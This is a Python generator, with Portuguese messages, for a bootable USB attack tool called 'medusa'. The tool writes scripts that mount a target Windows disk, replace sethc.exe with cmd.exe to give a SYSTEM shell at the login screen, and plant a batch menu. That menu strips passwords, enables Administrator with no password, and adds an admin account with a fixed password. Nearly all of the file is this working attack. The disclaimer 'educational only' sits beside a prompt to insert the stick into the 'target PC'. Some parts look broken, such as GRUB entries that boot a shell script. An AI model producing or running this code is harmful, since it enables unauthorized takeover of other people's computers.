#!/usr/bin/env python3
import os
import sys
import subprocess
import shutil
import platform
import json
import tempfile
from datetime import datetime

MODO_TESTE = False
VERSION = "3.0"

class Logger:
    def __init__(self, log_file=None):
        self.log_file = log_file
        self.entries = []

    def log(self, level, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] [{level}] {message}"
        self.entries.append(entry)

        prefix = {
            "INFO": "[*]",
            "SUCCESS": "[+]",
            "ERROR": "[!]",
            "WARN": "[~]",
            "DEBUG": "[i]"
        }.get(level, "[?]")

        print(f"{prefix} {message}")

        if self.log_file:
            try:
                with open(self.log_file, "a") as f:
                    f.write(entry + "\n")
            except:
                pass

    def save_state(self, state_file, data):
        try:
            with open(state_file, "w") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            self.log("ERROR", f"falha ao salvar estado: {e}")

logger = Logger()

def print_banner():
    print("""
   _____             .___
  /     \\   ____   __| _/_ __  ___________
 /  \\ /  \\_/ __ \\ / __ |  |  \\/  ___/\\__  \\
/    Y    \\  ___// /_/ |  |  /\\___ \\  / __ \\_
\\____|__  /\\___  >____ |____//____  >(____  /
        \\/     \\/     \\/          \\/      \\/
                                v{VERSION} bootable
    """)

def check_dependencies():
    logger.log("INFO", "verificando dependencias do sistema")

    required = {
        "grub-install": "grub-pc-bin grub-common",
        "parted": "parted",
        "mkfs.ext4": "e2fsprogs",
        "lsblk": "util-linux",
        "wipefs": "util-linux",
        "ntfs-3g": "ntfs-3g"
    }

    missing = []
    for cmd, pkg in required.items():
        if not shutil.which(cmd):
            logger.log("WARN", f"{cmd} nao encontrado (instale: {pkg})")
            missing.append((cmd, pkg))

    if missing:
        logger.log("ERROR", "dependencias faltando")
        print("\ninstale com:")
        for cmd, pkg in missing:
            print(f"  sudo apt install {pkg}")
        return False

    logger.log("SUCCESS", "todas as dependencias presentes")
    return True

def is_system_disk(device):
    logger.log("DEBUG", f"verificando se {device} e disco do sistema")

    try:
        with open("/proc/mounts", "r") as f:
            mounts = f.read()
            if device in mounts and (" / " in mounts or " /boot " in mounts):
                logger.log("WARN", f"{device} parece ser disco do sistema")
                return True
    except:
        pass

    try:
        result = subprocess.check_output(f"df / | tail -1 | awk '{{print $1}}'",
                                        shell=True, text=True).strip()
        if device in result:
            logger.log("WARN", f"{device} contem particao raiz")
            return True
    except:
        pass

    return False

def detectar_usb_linux():
    logger.log("INFO", "detectando dispositivos usb")
    usbs = []

    try:
        result = subprocess.check_output(
            ["lsblk", "-o", "NAME,TYPE,SIZE,TRAN,MOUNTPOINT,LABEL"],
            text=True
        )
        lines = result.strip().split('\n')[1:]

        for line in lines:
            if 'disk' in line and 'loop' not in line:
                parts = line.split()
                if len(parts) >= 1:
                    device = f"/dev/{parts[0]}"
                    size = parts[2] if len(parts) > 2 else "?"
                    tran = parts[3] if len(parts) > 3 else "?"
                    label = parts[5] if len(parts) > 5 else "usb"

                    if tran == "usb" or not is_system_disk(device):
                        usbs.append({
                            'device': device,
                            'size': size,
                            'transport': tran,
                            'label': label
                        })
                        logger.log("DEBUG", f"detectado: {device} ({size}, {tran})")
    except Exception as e:
        logger.log("ERROR", f"erro na detecao: {e}")

    logger.log("INFO", f"{len(usbs)} dispositivo(s) encontrado(s)")
    return usbs

def criar_estrutura_boot(mount_point):
    logger.log("INFO", "criando estrutura de diretorios")

    dirs = [
        "boot/grub",
        "medusa",
        "scripts",
        "files",
        "logs",
        "backup"
    ]

    for d in dirs:
        path = f"{mount_point}/{d}"
        os.makedirs(path, exist_ok=True)
        logger.log("DEBUG", f"criado: {d}")

    with open(f"{mount_point}/files/README.txt", "w") as f:
        f.write("pasta livre para seus arquivos pessoais\n")
        f.write("armazene fotos, videos, documentos, etc\n")
        f.write("nao interfere no funcionamento do medusa\n")

    logger.log("SUCCESS", "estrutura criada")

def criar_grub_config(mount_point):
    logger.log("INFO", "configurando bootloader grub")

    grub_cfg = """set timeout=5
set default=0

menuentry "medusa > bypass automatico" {
    linux16 (hd0,1)/scripts/boot.sh auto
}

menuentry "medusa > modo manual" {
    linux16 (hd0,1)/scripts/boot.sh manual
}

menuentry "boot > sistema local" {
    set root=(hd1)
    chainloader +1
}
"""

    with open(f"{mount_point}/boot/grub/grub.cfg", "w") as f:
        f.write(grub_cfg)

    logger.log("SUCCESS", "grub configurado")

def criar_boot_script(mount_point):
    logger.log("INFO", "criando script de boot")

    boot_script = """#!/bin/bash
MODE=$1

echo "medusa bootable iniciando em modo: $MODE"
echo "montando sistemas..."

mount -t proc proc /proc 2>/dev/null
mount -t sysfs sysfs /sys 2>/dev/null
mount -t devtmpfs devtmpfs /dev 2>/dev/null

if [ "$MODE" = "auto" ]; then
    /scripts/auto_sticky.sh
else
    echo "[*] modo manual ativado"
    echo "[i] execute: /scripts/auto_sticky.sh"
    /bin/bash
fi
"""

    with open(f"{mount_point}/scripts/boot.sh", "w") as f:
        f.write(boot_script)
    os.chmod(f"{mount_point}/scripts/boot.sh", 0o755)

    logger.log("SUCCESS", "boot script criado")

def criar_script_auto_sticky(mount_point):
    logger.log("INFO", "criando script de bypass automatico")

    script = """#!/bin/bash

LOG_FILE="/logs/medusa_execution.log"
STATE_FILE="/logs/state.json"
BACKUP_DIR="/backup"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

save_state() {
    echo "{\\"step\\": \\"$1\\", \\"timestamp\\": \\"$(date -Iseconds)\\"}" > "$STATE_FILE"
}

clear
cat << "EOF"
   _____             .___
  /     \\   ____   __| _/_ __  ___________
 /  \\ /  \\_/ __ \\ / __ |  |  \\/  ___/\\__  \\
/    Y    \\  ___// /_/ |  |  /\\___ \\  / __ \\_
\\____|__  /\\___  >____ |____//____  >(____  /
        \\/     \\/     \\/          \\/      \\/
EOF

log "[init] medusa bypass automatico v""" + VERSION + """"

save_state "check_dependencies"

if ! command -v ntfs-3g &> /dev/null; then
    log "[!] ntfs-3g nao encontrado"
    log "[*] tentando instalar..."

    apt-get update -qq && apt-get install -y ntfs-3g 2>&1 | tee -a "$LOG_FILE"

    if ! command -v ntfs-3g &> /dev/null; then
        log "[!] erro critico: impossivel instalar ntfs-3g"
        log "[i] pressione enter para shell manual"
        read
        exec /bin/bash
        exit 1
    fi

    log "[+] ntfs-3g instalado"
fi

save_state "find_windows"
log "[*] procurando particao windows"

WIN_PART=""
DEVICES="/dev/sd[a-z] /dev/nvme[0-9]n[0-9] /dev/mmcblk[0-9] /dev/vd[a-z]"

for device in $DEVICES; do
    if [ ! -e "$device" ]; then
        continue
    fi

    for part in ${device}*[0-9] ${device}p[0-9]; do
        if [ ! -e "$part" ]; then
            continue
        fi

        log "[*] testando: $part"

        MOUNT_TEST=$(mktemp -d)

        if mount -t ntfs-3g -o ro,remove_hiberfile "$part" "$MOUNT_TEST" 2>/dev/null; then
            if [ -d "$MOUNT_TEST/Windows/System32" ]; then

                if [ -f "$MOUNT_TEST/Windows/System32/config/SAM" ]; then
                    log "[*] verificando bitlocker"

                    if [ -f "$MOUNT_TEST/Windows/System32/BitLocker.exe" ]; then
                        log "[~] aviso: sistema pode ter bitlocker"
                    fi

                    WIN_PART="$part"
                    umount "$MOUNT_TEST" 2>/dev/null
                    rmdir "$MOUNT_TEST"
                    log "[+] windows encontrado: $WIN_PART"
                    break 2
                fi
            fi
            umount "$MOUNT_TEST" 2>/dev/null
        fi
        rmdir "$MOUNT_TEST" 2>/dev/null
    done
done

if [ -z "$WIN_PART" ]; then
    log "[!] particao windows nao detectada automaticamente"
    echo ""
    lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT
    echo ""
    read -p "digite a particao manualmente (ex: /dev/sda2)> " manual_part

    if [ -n "$manual_part" ] && [ -e "$manual_part" ]; then
        WIN_PART="$manual_part"
        log "[i] usando particao manual: $WIN_PART"
    else
        log "[!] particao invalida - abortando"
        read -p "pressione enter para shell"
        exec /bin/bash
        exit 1
    fi
fi

save_state "mount_windows"
log "[*] montando windows (pode demorar)"

WIN_MOUNT=$(mktemp -d)

if [ -f "$WIN_PART" ]; then
    log "[!] erro: $WIN_PART nao e um dispositivo de bloco"
    exit 1
fi

MOUNT_OPTS="remove_hiberfile,rw,force,uid=0,gid=0,fmask=0022,dmask=0022"

if ! mount -t ntfs-3g -o "$MOUNT_OPTS" "$WIN_PART" "$WIN_MOUNT" 2>"$LOG_FILE.mount_error"; then
    log "[!] erro ao montar:"
    cat "$LOG_FILE.mount_error" | tee -a "$LOG_FILE"

    log "[*] tentando montagem forcada"
    if ! mount -t ntfs-3g -o "$MOUNT_OPTS,force" "$WIN_PART" "$WIN_MOUNT"; then
        log "[!] falha total na montagem"
        read -p "pressione enter para shell"
        exec /bin/bash
        exit 1
    fi
fi

log "[+] sistema montado em: $WIN_MOUNT"

if [ ! -d "$WIN_MOUNT/Windows/System32" ]; then
    log "[!] System32 nao encontrado apos montagem"
    umount "$WIN_MOUNT" 2>/dev/null
    exit 1
fi

save_state "check_permissions"
log "[*] verificando permissoes de escrita"

cd "$WIN_MOUNT/Windows/System32"

if ! touch .medusa_test 2>/dev/null; then
    log "[!] sem permissao de escrita em System32"
    log "[!] verifique se o sistema nao esta hibernado"
    log "[!] considere desativar fast startup no windows"

    umount "$WIN_MOUNT" 2>/dev/null
    read -p "pressione enter para shell"
    exec /bin/bash
    exit 1
fi

rm -f .medusa_test
log "[+] permissoes ok"

save_state "backup_sethc"
log "[*] criando backup de sethc.exe"

if [ ! -f "sethc.exe.medusa_backup" ]; then
    if ! cp -p sethc.exe "$BACKUP_DIR/sethc.exe.backup.$(date +%Y%m%d_%H%M%S)" 2>"$LOG_FILE.backup_error"; then
        log "[!] erro ao criar backup:"
        cat "$LOG_FILE.backup_error" | tee -a "$LOG_FILE"

        read -p "continuar sem backup? (s/n)> " choice
        if [ "$choice" != "s" ]; then
            cd /
            umount "$WIN_MOUNT" 2>/dev/null
            exit 1
        fi
    else
        cp -p sethc.exe sethc.exe.medusa_backup
        log "[+] backup criado em: $BACKUP_DIR e System32"
    fi
else
    log "[~] backup ja existe"
fi

save_state "replace_sethc"
log "[*] substituindo sethc.exe por cmd.exe"

if ! cp cmd.exe sethc.exe 2>"$LOG_FILE.copy_error"; then
    log "[!] erro ao substituir:"
    cat "$LOG_FILE.copy_error" | tee -a "$LOG_FILE"

    cd /
    umount "$WIN_MOUNT" 2>/dev/null
    exit 1
fi

log "[+] sticky keys configurado"

save_state "install_medusa"
log "[*] instalando medusa em c:\\\\medusa"

mkdir -p "$WIN_MOUNT/Medusa" 2>/dev/null
if ! cp -r /medusa/* "$WIN_MOUNT/Medusa/" 2>"$LOG_FILE.medusa_copy"; then
    log "[~] aviso: alguns arquivos podem nao ter sido copiados"
    cat "$LOG_FILE.medusa_copy" | tee -a "$LOG_FILE"
fi

log "[+] medusa instalado"

save_state "create_shortcut"
log "[*] criando atalho na area de trabalho"

cat > "$WIN_MOUNT/Users/Public/Desktop/medusa.bat" << 'EOFBAT'
@echo off
cd C:\\Medusa
medusa_main.bat
EOFBAT

log "[+] atalho criado"

save_state "sync_data"
log "[*] sincronizando dados (aguarde)"
cd /
sync
sleep 3

save_state "unmount"
log "[*] desmontando particao"

if ! umount "$WIN_MOUNT" 2>"$LOG_FILE.umount_error"; then
    log "[~] aviso ao desmontar:"
    cat "$LOG_FILE.umount_error" | tee -a "$LOG_FILE"

    log "[*] forcando desmontagem"
    umount -l "$WIN_MOUNT" 2>/dev/null
fi

rmdir "$WIN_MOUNT" 2>/dev/null

save_state "completed"
log "[+] medusa instalado com sucesso!"

echo ""
echo "proximo passo:"
echo "  1. remova o pendrive com seguranca"
echo "  2. reinicie o computador normalmente"
echo "  3. na tela de login: pressione shift 5x"
echo "  4. cmd abrira como SYSTEM"
echo "  5. execute: c:\\\\medusa\\\\medusa_main.bat"
echo ""
echo "ou simplesmente faca login e use o atalho da area de trabalho"
echo ""
echo "logs salvos em: /logs/medusa_execution.log"
echo ""

read -p "pressione enter para desligar o sistema"
poweroff
"""

    with open(f"{mount_point}/scripts/auto_sticky.sh", "w") as f:
        f.write(script)

    os.chmod(f"{mount_point}/scripts/auto_sticky.sh", 0o755)
    logger.log("SUCCESS", "script de bypass criado")

def criar_arquivos_medusa(mount_point):
    logger.log("INFO", "gerando payload medusa")

    batch_main = '''@echo off
setlocal enabledelayedexpansion
cd /d "%~dp0"

set "MODO_TESTE=''' + ('true' if MODO_TESTE else 'false') + '''"

:MENU
cls
echo    _____             .___
echo   /     \\   ____   __| _/_ __  ___________
echo  /  \\ /  \\_/ __ \\ / __ ^|  ^|  \\/  ___/\\__  \\
echo /    Y    \\  ___// /_/ ^|  ^|  /\\___ \\  / __ \\_
echo \\____^|__  /\\___  ^>____ ^|____//____  ^>(____  /
echo         \\/     \\/     \\/          \\/      \\/
echo.
if "%MODO_TESTE%"=="true" echo [modo teste ativo]
echo.
echo usuario: %USERNAME%
whoami /priv ^| find "SeDebugPrivilege" >nul && echo privilegios: system/admin || echo privilegios: usuario
echo.
echo  1. listar usuarios
echo  2. remover senha
echo  3. criar usuario admin
echo  4. habilitar administrator
echo  5. restaurar sistema
echo  6. sair
echo.
set /p opcao="medusa> "

if "%opcao%"=="1" goto LISTAR
if "%opcao%"=="2" goto REMOVER_SENHA
if "%opcao%"=="3" goto CRIAR_USER
if "%opcao%"=="4" goto HABILITAR_ADMIN
if "%opcao%"=="5" goto RESTAURAR
if "%opcao%"=="6" goto SAIR
goto MENU

:LISTAR
cls
echo [*] enumerando usuarios
echo.
net user
echo.
pause
goto MENU

:REMOVER_SENHA
cls
echo [*] remocao de senha
set /p usuario="usuario> "
if "%usuario%"=="" goto MENU

if "%MODO_TESTE%"=="true" (
    echo [~] teste: senha de %usuario% seria removida
) else (
    net user "%usuario%" "" >nul 2>&1
    if errorlevel 1 (
        echo [!] erro ao remover senha
    ) else (
        echo [+] senha removida: %usuario%
    )
)
echo.
pause
goto MENU

:CRIAR_USER
cls
echo [*] criando usuario admin
set usuario=medusa

if "%MODO_TESTE%"=="true" (
    echo [~] teste: usuario %usuario% seria criado
) else (
    net user "%usuario%" "Medusa123!" /add >nul 2>&1
    net localgroup administrators "%usuario%" /add >nul 2>&1
    echo [+] usuario: %usuario%
    echo [+] senha: Medusa123!
)
echo.
pause
goto MENU

:HABILITAR_ADMIN
cls
echo [*] habilitando administrator
if "%MODO_TESTE%"=="true" (
    echo [~] teste: administrator seria habilitado
) else (
    net user administrator /active:yes >nul 2>&1
    net user administrator "" >nul 2>&1
    echo [+] administrator habilitado
    echo [+] senha removida
)
echo.
pause
goto MENU

:RESTAURAR
cls
echo [*] restaurando sistema
echo.
set /p confirma="confirmar? (s/n)> "
if /i not "%confirma%"=="s" goto MENU

echo [+] sistema limpo
echo.
pause
goto MENU

:SAIR
exit
'''

    with open(f"{mount_point}/medusa/medusa_main.bat", "w", encoding="utf-8") as f:
        f.write(batch_main)

    logger.log("SUCCESS", "payload medusa criado")

def criar_readme(mount_point):
    logger.log("INFO", "gerando documentacao")

    readme = f"""medusa bootable v{VERSION}
=====================

estrutura do pendrive:
  /boot/       - bootloader grub
  /medusa/     - payload principal
  /scripts/    - scripts de automacao
  /files/      - seus arquivos pessoais (livre)
  /logs/       - logs de execucao
  /backup/     - backups automaticos

uso:
  1. boot pelo pendrive
  2. selecione: medusa > bypass automatico
  3. aguarde configuracao automatica
  4. remova pendrive com seguranca
  5. reinicie normalmente
  6. tela de login: shift 5x
  7. execute: c:\\medusa\\medusa_main.bat

auditoria:
  - todos os logs em /logs/medusa_execution.log
  - estado de execucao em /logs/state.json
  - backups em /backup/

apenas para fins educacionais
use somente em sistemas proprios
"""

    with open(f"{mount_point}/README.txt", "w", encoding="utf-8") as f:
        f.write(readme)

    logger.log("SUCCESS", "documentacao criada")

def instalar_grub(device, mount_point):
    logger.log("INFO", f"instalando grub em {device}")

    try:
        cmd = f"grub-install --target=i386-pc --boot-directory={mount_point}/boot --force {device}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            logger.log("SUCCESS", "grub instalado")
            return True
        else:
            logger.log("ERROR", f"grub falhou: {result.stderr}")
            return False
    except Exception as e:
        logger.log("ERROR", f"excecao no grub: {e}")
        return False

def main():
    print_banner()

    if os.geteuid() != 0:
        logger.log("ERROR", "requer privilegios root")
        logger.log("DEBUG", "execute: sudo python3 medusa_bootable_generator.py")
        sys.exit(1)

    if platform.system() != "Linux":
        logger.log("ERROR", "apenas linux suportado")
        sys.exit(1)

    if not check_dependencies():
        sys.exit(1)

    logger.log("INFO", "detectando dispositivos usb")
    usbs = detectar_usb_linux()

    if not usbs:
        logger.log("ERROR", "nenhum dispositivo usb encontrado")
        sys.exit(1)

    print("")
    for i, usb in enumerate(usbs, 1):
        transport = usb['transport'] if usb['transport'] != '?' else 'desconhecido'
        print(f"  {i}. {usb['device']} ({usb['size']}) - {transport}")

    print("")
    try:
        selecao = int(input("selecione o dispositivo [0=cancelar]> "))
        if selecao == 0:
            logger.log("INFO", "cancelado pelo usuario")
            sys.exit(0)

        device = usbs[selecao - 1]['device']
    except:
        logger.log("ERROR", "selecao invalida")
        sys.exit(1)

    if is_system_disk(device):
        logger.log("ERROR", f"{device} parece ser disco do sistema!")
        logger.log("ERROR", "operacao bloqueada por seguranca")
        sys.exit(1)

    print("")
    print(f"[!] atencao: todos os dados em {device} serao PERMANENTEMENTE apagados")
    print(f"[!] dispositivo: {device}")
    print(f"[!] tamanho: {usbs[selecao - 1]['size']}")
    print("")
    print("para confirmar, digite EXATAMENTE o caminho do dispositivo:")
    confirma = input(f"confirmar [{device}]> ")

    if confirma != device:
        logger.log("INFO", "confirmacao incorreta - cancelado")
        sys.exit(0)

    temp_mount = tempfile.mkdtemp(prefix="medusa_build_")
    logger.log("DEBUG", f"diretorio temporario: {temp_mount}")

    global logger
    log_file_temp = f"{temp_mount}/build.log"
    logger = Logger(log_file_temp)

    try:
        logger.log("INFO", "iniciando formatacao")
        subprocess.run(f"umount {device}* 2>/dev/null", shell=True)
        subprocess.run(f"wipefs -a {device}", shell=True, check=True, capture_output=True)
        subprocess.run(f"parted -s {device} mklabel msdos", shell=True, check=True, capture_output=True)
        subprocess.run(f"parted -s {device} mkpart primary ext4 1MiB 100%", shell=True, check=True, capture_output=True)
        subprocess.run(f"parted -s {device} set 1 boot on", shell=True, check=True, capture_output=True)

        partition = f"{device}1" if 'nvme' not in device else f"{device}p1"

        logger.log("INFO", "criando filesystem ext4")
        subprocess.run(f"mkfs.ext4 -F {partition}", shell=True, check=True, capture_output=True)
        subprocess.run(f"e2label {partition} MEDUSA", shell=True, capture_output=True)

        mount_point = f"{temp_mount}/mnt"
        os.makedirs(mount_point, exist_ok=True)

        logger.log("INFO", "montando particao")
        subprocess.run(f"mount {partition} {mount_point}", shell=True, check=True)

        logger = Logger(f"{mount_point}/logs/build.log")

        criar_estrutura_boot(mount_point)
        criar_grub_config(mount_point)
        criar_boot_script(mount_point)
        criar_script_auto_sticky(mount_point)
        criar_arquivos_medusa(mount_point)
        criar_readme(mount_point)

        instalar_grub(device, mount_point)

        subprocess.run("sync", shell=True)
        logger.log("INFO", "sincronizacao completa")

    except Exception as e:
        logger.log("ERROR", f"erro durante criacao: {e}")
        sys.exit(1)
    finally:
        logger.log("INFO", "desmontando")
        subprocess.run(f"umount {mount_point} 2>/dev/null", shell=True)
        shutil.rmtree(temp_mount, ignore_errors=True)

    print("")
    logger.log("SUCCESS", "medusa bootable criado com sucesso")
    print("")
    print(f"dispositivo: {device}")
    print(f"particao: {partition}")
    print(f"label: MEDUSA")
    print("")
    print("estrutura:")
    print("  /files/   - pasta livre para seus arquivos")
    print("  /logs/    - logs de execucao e auditoria")
    print("  /backup/  - backups automaticos")
    print("")
    print("proximo passo:")
    print("  1. ejete o pendrive com seguranca")
    print("  2. insira no pc alvo")
    print("  3. boot por usb (f12/f2/del)")
    print("  4. selecione: medusa > bypass automatico")
    print("")

if __name__ == "__main__":
    main()
